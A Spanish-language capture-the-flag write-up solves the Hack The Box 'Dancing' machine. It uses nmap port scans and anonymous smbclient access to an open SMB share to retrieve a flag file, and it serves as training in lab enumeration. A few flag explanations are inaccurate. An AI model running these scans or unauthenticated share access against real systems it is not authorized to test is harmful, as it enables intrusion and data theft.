---
layout: single
title: Dancing - Hack The Box
excerpt: "Dancing es una máquina muy fácil que forma parte del Tier 0 de las máquinas para principiantes del Starting Point de Hack The Box. Para poder completar esta máquina, tendremos que conectarnos a ella a través de la VPN, para posteriormente comprometer la máquina mediante técnicas de reconocimiento para abusar de las vulnerabilidades existentes. En este caso, estaremos tocando SMB, un protocolo de red utilizado para ofrecer acceso compartido a archivos entre los nodos de una red."
date: 2022-10-27
classes: wide
header:
  teaser: /assets/images/htb-writeup-dancing/dancing-logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - CTFs
  - Windows
tags:  
  - smb
  - smb enumeration
---

![](/assets/images/htb-writeup-dancing/dancing-logo.png)

Dancing es una máquina Windows muy fácil que forma parte del Tier 0 de las máquinas para principiantes del Starting Point de Hack The Box. Para poder completar esta máquina, tendremos que conectarnos a ella a través de la VPN, para posteriormente comprometer la máquina mediante técnicas de reconocimiento y escaneos para abusar de las vulnerabilidades existentes. En este caso, estaremos tocando `Server Message Block (SMB)`, un protocolo de red utilizado para ofrecer acceso compartido a archivos, impresoras y otros puertos entre los nodos de una red.

## Reconocimiento Inicial

```
ping -c 1 10.129.72.119

PING 10.129.72.119 ( 10.129.72.119) 56(84) bytes of data.
64 bytes from 10.129.72.119: icmp_seq=1 ttl=127 time=44.4 ms

--- 10.129.72.119 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time Oms
rtt min/avg/max/mdev = 44.364/44.364/44.364/0.000 ms
```

## Escaneo de Puertos

```
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.72.119 -oG allPorts

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-14 17:11 CEST
Nmap scan report for 10.129.72.119
Host is up (0.12s latency).
Not shown: 62303 closed top ports (reset), 3221 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE
135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
5985/tcp open wsman
47001/tcp open winrm
49664/tcp open unknown
49665/tcp open unknown
49666/tcp open unknown
49667/tcp open unknown
49668/tcp open unknown
49669/tcp open unknown

Nmap done: 1 IP address (1 host up) scanned in 22.57 seconds
```

**Escaneo inicial de puertos abiertos con Nmap**
- **-p-** Escanea todo el rango de puertos [1-65535]
- **--open** Muestro solo los puertos abiertos
- **-sS** Aplica un TCP SYN Port Scan
- **--min-rate** Indica el número de paquetes por segundo a emitir
- **-vvv** Muestra por pantalla la información descubierta durante el escaneo
- **-n** Indica que no se aplicará resolución DNS durante el escaneo 
- **-Pn** Indica que no se aplicará el protocolo ARP durante el escaneo
- **-oG** Exporta el output del escaneo a un fichero en formato grepeable

![](/assets/images/htb-writeup-dancing/allPorts.png)

```
sudo nmap -sCV -p135, 139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.129.72.119 -oN targeted 

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-14 17:16 CEST
Nmap scan report for 10.129.72.119
Host is up (0.090s latency).

PORT STATE SERVICE VERSION
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds?
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 | http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 | http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
49664/tcp open msrpc Microsoft Windows RPC
49665/tcp open msrpc Microsoft Windows RPC
49666/tcp open msrpc Microsoft Windows RPC
49667/tcp open msrpc Microsoft Windows RPC
49668/tcp open msrpc Microsoft Windows RPC
49669/tcp open msrpc Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft windows

Host script results:
 |_clock-skew: 4h00m09s
 | smb2-security-mode:
 |    3.1.1: 1.
 |_     Message signing enabled but not required
 | smb2-time:
 |    date: 2022-08-14T19:17:29
 |_   start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 
1 IP address (1 host up) scanned in 64.31 seconds
```

**Escaneo avanzado de detección de versiones y servicios con Nmap**
- **-p** Escanea los puertos especificados
- **-sV** Activa la detección de versiones y servicios
- **-sC** Lanza scripts básicos de reconocimiento y enumeración
- **-oG** Exporta el output del escaneo a un fichero en formato normal

![](/assets/images/htb-writeup-dancing/targeted.png)

## Detección de vulnerabilidades

Como podemos ver en el escaneo, hemos identificado que el puerto `445/tcp` está en estado abierto, ejecutando el servicio `SMB` de Microsoft-DS. `Server Message Block (SMB)` es un protocolo de red utilizado para ofrecer acceso compartido a archivos, impresoras y otros puertos entre los nodos de una red. Por lo tanto, el cliente puede leer, crear y actualizar archivos en el servidor remoto. Normalmente, el almacenamiento habilitado para SMB, denominado recurso compartido, puede ser accedido por cualquier cliente que tenga la dirección del servidor y las credenciales adecuadas. Sin embargo, a veces un administrador de red puede hacer errores y permitir accidentalmente `inicios de sesión sin ninguna credencial` válida o usando cuentas de invitado o inicios de sesión anónimos.

## Explotación de vulnerabilidades

**SMB**

Procedemos a listar los recursos compartidos del servidor `SMB` con `smbclient`, el parámetro `-L` para listar los directorios compartidos y la `ip de la máquina víctima`.

```
smbclient -L 10.129.72.119

Password for [WORK GROUP\root]:

    Sharename       Type    Comment
    ---------       ----    -------
    ADMIN$          Disk    Remote Admin
    C$              Disk    Default share
    IPC$            IPC     Remote IPC
    WorkShares      Disk 
    
Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.129.72.119 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Como podemos ver, de todos los recursos compartidos mostrados, el único que no requiere de credenciales válidas es el recurso `WorkShares`, por lo que procedemos a conectarnos a él sin contraseña.

```
smbclient \\\10.129.72.119\\WorkShares

Password for [WORK GROUP\root]: 
Try "help" to get a list of possible commands.
smb: \>
```

Una vez dentro del servidor, podemos descargar la `flag.txt` a nuestro host local con el comando `get`, seguido del nombre del archivo que queremos descargar y el comando `exit` para salir.

```
smb: > ls
  
  .                                 D        0  Mon Mar 29 10:22:01 2021
  ..                                D        0  Mon Mar 29 10:22:01 2021
  Amy.J                             D        0  Mon Mar 29 11:08:24 2021
  James.P                           D        0  Thu Jun 3 10:38:03 2021

              5114111 blocks of size 4096. 1748775 blocks available
              
smb: > cd James.P\

smb: \James.P\> ls

  .                                 D        0  Thu Jun 3 10:38:03 2021
  ..                                D        0  Thu Jun 3 10:38:03 2021 
  flag.txt                          A       32  Mon Mar_29 11:26:57 2021

              5114111 blocks of size 4096. 1748775 blocks available

smb: \James.P\> get flag.txt 

getting file \James.P\flag.txt of size 32 as flag.txt (0,1 Kilobytes/sec) (average 0,1 Kilobytes/sec)

smb: \James.pl> exit
```

Finalmente, si salimos del servicio SMB después de transferir la flag del servidor a nuestro host, tendremos en nuestro equipo la `flag` de HackTheBox, que es nuestro objetivo principal.

![](/assets/images/htb-writeup-dancing/flag.png)